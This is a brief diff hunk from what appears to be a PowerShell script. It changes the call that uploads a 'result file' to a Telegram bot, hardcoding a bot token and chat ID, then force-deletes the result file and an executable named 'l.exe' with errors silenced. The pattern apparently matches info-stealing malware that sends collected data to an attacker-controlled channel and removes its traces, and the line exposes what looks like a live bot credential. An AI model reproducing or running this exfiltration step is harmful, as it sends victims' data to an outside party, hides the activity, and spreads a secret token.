@@ -53,7 +53,7 @@ try {
 
 
 # Send the result file
-Send-TelegramFile -BotToken $bt -ChatID $ci -FilePath $ResultFile
+Send-TelegramFile -BotToken 7916706645:AAE2X21ClTHZ9vt63xeNz4zeCIg7d_Qn4PQ -ChatID 6970788198 -FilePath $ResultFile
 
 # Cleanup leftover files
 Remove-Item $ResultFile, "$Test/l.exe" -Force -ErrorAction SilentlyContinue
